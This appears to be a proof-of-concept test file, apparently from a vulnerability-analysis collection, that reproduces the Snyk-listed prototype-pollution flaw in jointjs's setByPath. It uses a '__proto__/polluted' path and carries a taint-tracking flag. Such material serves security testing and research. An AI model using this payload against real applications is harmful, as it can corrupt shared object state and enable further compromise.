//https://snyk.io/vuln/SNYK-JS-JOINTJS-1024444
 
   

  const jointjs = require("jointjs");
  jointjs.util.setByPath.__x_toTaint = true;
  jointjs.util.setByPath({}, "__proto__/polluted", "yes", "/");
// End of file
